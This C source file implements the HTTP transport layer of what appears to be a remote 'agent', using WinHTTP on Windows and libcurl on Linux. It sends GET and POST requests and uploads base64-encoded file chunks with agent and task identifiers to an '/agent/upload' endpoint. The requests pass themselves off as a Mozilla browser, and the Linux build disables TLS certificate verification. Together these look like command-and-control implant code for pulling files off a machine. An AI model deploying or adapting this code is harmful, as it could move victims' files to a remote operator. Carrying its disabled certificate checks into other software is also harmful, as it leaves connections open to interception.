/*
 * ============================================================
 *  http.c - Implementation de la couche HTTP
 *
 *  Compilation conditionnelle :
 *    - PLATFORM_WINDOWS > WinHTTP (natif, pas de DLL externe)
 *    - PLATFORM_LINUX   > libcurl
 * ============================================================
 */
#include "platform.h"
#include "config.h"
#include "http.h"
/* ============================================================
 *  IMPLEMENTATION WINDOWS - WinHTTP
 * ============================================================ */

#ifdef PLATFORM_WINDOWS

/**
 * Convertit une chaine etroite (char*) en chaine large (wchar_t*).
 * WinHTTP exige des chaines UTF-16 pour les hotes et chemins.
 */
void str_to_wide(const char *src, wchar_t *dst, int dst_sz) {
    MultiByteToWideChar(CP_UTF8, 0, src, -1, dst, dst_sz);
}

/**
 * Decompose une URL "http://host:port/path" en composants separes.
 * WinHTTP a besoin du host, port et path de maniere independante.
 */
void parse_url(const char *url,
               char *host, size_t host_sz,
               INTERNET_PORT *port,
               char *path, size_t path_sz) {
    memset(host, 0, host_sz);
    memset(path, 0, path_sz);
    *port = 80;

    const char *p = url;
    if      (strncmp(p, "https://", 8) == 0) { p += 8; *port = 443; }
    else if (strncmp(p, "http://",  7) == 0) { p += 7; *port = 80;  }

    const char *colon = strchr(p, ':');
    const char *slash = strchr(p, '/');

    if (colon && (!slash || colon < slash)) {
        /* Format : host:port[/path] */
        size_t hlen = (size_t)(colon - p);
        if (hlen >= host_sz) hlen = host_sz - 1;
        memcpy(host, p, hlen);
        *port = (INTERNET_PORT)atoi(colon + 1);
        p = slash ? slash : p + strlen(p);
    } else if (slash) {
        /* Format : host/path (port implicite) */
        size_t hlen = (size_t)(slash - p);
        if (hlen >= host_sz) hlen = host_sz - 1;
        memcpy(host, p, hlen);
        p = slash;
    } else {
        /* Host seul */
        strncpy(host, p, host_sz - 1);
        p += strlen(p);
    }

    if (*p == '/') strncpy(path, p, path_sz - 1);
    else           strncpy(path, "/", path_sz - 1);
}

/**
 * Lit le corps complet d'une reponse WinHTTP dans un HttpBuffer.
 * Realloue dynamiquement - l'appelant doit free(resp->data).
 */
void winhttp_read_body(HINTERNET hReq, HttpBuffer *resp) {
    resp->data = malloc(1);
    resp->size = 0;
    if (resp->data) resp->data[0] = '\0';

    char  chunk[8192];
    DWORD n = 0;
    while (WinHttpReadData(hReq, chunk, sizeof(chunk), &n) && n > 0) {
        char *ptr = realloc(resp->data, resp->size + n + 1);
        if (!ptr) break;
        resp->data = ptr;
        memcpy(resp->data + resp->size, chunk, n);
        resp->size += n;
        resp->data[resp->size] = '\0';
    }
}

/**
 * Recupere le code HTTP numerique et lit le corps de la reponse.
 * Retourne -1 si l'interrogation du header echoue.
 */
long winhttp_status_and_read(HINTERNET hReq, HttpBuffer *resp) {
    DWORD status    = 0;
    DWORD status_sz = sizeof(status);
    BOOL  ok = WinHttpQueryHeaders(
        hReq,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX,
        &status, &status_sz,
        WINHTTP_NO_HEADER_INDEX
    );
    if (!ok) {
        resp->data = malloc(1);
        resp->size = 0;
        if (resp->data) resp->data[0] = '\0';
        return -1;
    }
    winhttp_read_body(hReq, resp);
    return (long)status;
}

/**
 * POST JSON via WinHTTP.
 * Retourne le code HTTP ou -1 si erreur reseau.
 */
long http_post_json(const char *url, const char *json_body, HttpBuffer *resp) {
    char          host[256]  = {0};
    char          path[512]  = {0};
    wchar_t       whost[256] = {0};
    wchar_t       wpath[512] = {0};
    INTERNET_PORT port       = 80;

    parse_url(url, host, sizeof(host), &port, path, sizeof(path));
    str_to_wide(host, whost, 256);
    str_to_wide(path, wpath, 512);

    DWORD tms = (DWORD)(HTTP_TIMEOUT_SEC * 1000);

    HINTERNET hSess = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0
    );
    if (!hSess) { resp->data = NULL; resp->size = 0; return -1; }
    WinHttpSetTimeouts(hSess, tms, tms, tms, tms);

    HINTERNET hConn = WinHttpConnect(hSess, whost, port, 0);
    if (!hConn) {
        WinHttpCloseHandle(hSess);
        resp->data = NULL; resp->size = 0; return -1;
    }

    HINTERNET hReq = WinHttpOpenRequest(
        hConn, L"POST", wpath, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0
    );
    if (!hReq) {
        WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess);
        resp->data = NULL; resp->size = 0; return -1;
    }

    LPCWSTR hdrs     = L"Content-Type: application/json\r\nAccept: application/json";
    DWORD   body_len = (DWORD)strlen(json_body);
    long    code     = -1;

    if (WinHttpSendRequest(hReq, hdrs, (DWORD)-1,
                           (LPVOID)json_body, body_len, body_len, 0)
        && WinHttpReceiveResponse(hReq, NULL)) {
        code = winhttp_status_and_read(hReq, resp);
    } else {
        resp->data = malloc(1);
        resp->size = 0;
        if (resp->data) resp->data[0] = '\0';
    }

    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConn);
    WinHttpCloseHandle(hSess);
    return code;
}

/**
 * POST un chunk de fichier (base64) vers /agent/upload.
 * Construit le JSON dynamiquement (b64_data peut faire ~512 KB).
 * Reutilise http_post_json() - pas de duplication de la logique reseau.
 */
long http_post_file_chunk(const char *url, const char *agent_id,
                          const char *task_id, const char *filename,
                          int chunk_idx, int total_chunks,
                          const char *b64_data, HttpBuffer *resp) {
    size_t b64_len  = strlen(b64_data);
    size_t body_sz  = b64_len + 256;   /* overhead champs JSON fixes */
    char  *body     = (char *)malloc(body_sz);
    if (!body) { resp->data = NULL; resp->size = 0; return -1; }

    snprintf(body, body_sz,
             "{\"agent_id\":\"%s\",\"task_id\":\"%s\",\"filename\":\"%s\","
             "\"chunk_index\":%d,\"total_chunks\":%d,\"data\":\"%s\"}",
             agent_id, task_id, filename, chunk_idx, total_chunks, b64_data);

    long code = http_post_json(url, body, resp);
    free(body);
    return code;
}

/**
 * GET via WinHTTP.
 * Retourne le code HTTP ou -1 si erreur reseau.
 */
long http_get(const char *url, HttpBuffer *resp) {
    char          host[256]  = {0};
    char          path[512]  = {0};
    wchar_t       whost[256] = {0};
    wchar_t       wpath[512] = {0};
    INTERNET_PORT port       = 80;

    parse_url(url, host, sizeof(host), &port, path, sizeof(path));
    str_to_wide(host, whost, 256);
    str_to_wide(path, wpath, 512);

    DWORD tms = (DWORD)(HTTP_TIMEOUT_SEC * 1000);

    HINTERNET hSess = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0
    );
    if (!hSess) { resp->data = NULL; resp->size = 0; return -1; }
    WinHttpSetTimeouts(hSess, tms, tms, tms, tms);

    HINTERNET hConn = WinHttpConnect(hSess, whost, port, 0);
    if (!hConn) {
        WinHttpCloseHandle(hSess);
        resp->data = NULL; resp->size = 0; return -1;
    }

    HINTERNET hReq = WinHttpOpenRequest(
        hConn, L"GET", wpath, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0
    );
    if (!hReq) {
        WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess);
        resp->data = NULL; resp->size = 0; return -1;
    }

    LPCWSTR hdrs = L"Accept: application/json";
    long    code = -1;

    if (WinHttpSendRequest(hReq, hdrs, (DWORD)-1,
                           WINHTTP_NO_REQUEST_DATA, 0, 0, 0)
        && WinHttpReceiveResponse(hReq, NULL)) {
        code = winhttp_status_and_read(hReq, resp);
    } else {
        resp->data = malloc(1);
        resp->size = 0;
        if (resp->data) resp->data[0] = '\0';
    }

    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConn);
    WinHttpCloseHandle(hSess);
    return code;
}


/* ============================================================
 *  IMPLEMENTATION LINUX - libcurl
 * ============================================================ */

#else  /* PLATFORM_LINUX */

/**
 * Callback libcurl : recoit les chunks de reponse et les accumule
 * dans un HttpBuffer en reallouant dynamiquement.
 */
size_t http_write_cb(void *data, size_t size, size_t nmemb, void *userp) {
    size_t real   = size * nmemb;
    HttpBuffer *b = (HttpBuffer *)userp;
    char *ptr = realloc(b->data, b->size + real + 1);
    if (!ptr) return 0;
    b->data = ptr;
    memcpy(b->data + b->size, data, real);
    b->size += real;
    b->data[b->size] = '\0';
    return real;
}

/**
 * POST JSON via libcurl.
 * Retourne le code HTTP ou -1 si erreur reseau.
 */
long http_post_json(const char *url, const char *json_body, HttpBuffer *resp) {
    resp->data = malloc(1); resp->size = 0; resp->data[0] = '\0';
    CURL *curl = curl_easy_init();
    if (!curl) return -1;
    struct curl_slist *hdrs = NULL;
    hdrs = curl_slist_append(hdrs, "Content-Type: application/json");
    hdrs = curl_slist_append(hdrs, "Accept: application/json");
    curl_easy_setopt(curl, CURLOPT_URL,           url);
    curl_easy_setopt(curl, CURLOPT_POST,           1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS,     json_body);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER,     hdrs);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION,  http_write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA,      resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT,        (long)HTTP_TIMEOUT_SEC);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, (long)HTTP_TIMEOUT_SEC);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    long code = -1;
    if (curl_easy_perform(curl) == CURLE_OK)
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &code);
    curl_slist_free_all(hdrs);
    curl_easy_cleanup(curl);
    return code;
}

/**
 * POST un chunk de fichier - Linux.
 * Identique a la version Windows : delegue a http_post_json().
 */
long http_post_file_chunk(const char *url, const char *agent_id,
                          const char *task_id, const char *filename,
                          int chunk_idx, int total_chunks,
                          const char *b64_data, HttpBuffer *resp) {
    size_t b64_len = strlen(b64_data);
    size_t body_sz = b64_len + 256;
    char  *body    = (char *)malloc(body_sz);
    if (!body) { resp->data = NULL; resp->size = 0; return -1; }

    snprintf(body, body_sz,
             "{\"agent_id\":\"%s\",\"task_id\":\"%s\",\"filename\":\"%s\","
             "\"chunk_index\":%d,\"total_chunks\":%d,\"data\":\"%s\"}",
             agent_id, task_id, filename, chunk_idx, total_chunks, b64_data);

    long code = http_post_json(url, body, resp);
    free(body);
    return code;
}

/**
 * GET via libcurl.
 * Retourne le code HTTP ou -1 si erreur reseau.
 */
long http_get(const char *url, HttpBuffer *resp) {
    resp->data = malloc(1); resp->size = 0; resp->data[0] = '\0';
    CURL *curl = curl_easy_init();
    if (!curl) return -1;
    struct curl_slist *hdrs = NULL;
    hdrs = curl_slist_append(hdrs, "Accept: application/json");
    curl_easy_setopt(curl, CURLOPT_URL,           url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER,    hdrs);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, http_write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA,     resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT,       (long)HTTP_TIMEOUT_SEC);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT,(long)HTTP_TIMEOUT_SEC);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER,0L);
    long code = -1;
    if (curl_easy_perform(curl) == CURLE_OK)
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &code);
    curl_slist_free_all(hdrs);
    curl_easy_cleanup(curl);
    return code;
}

#endif /* HTTP platform */
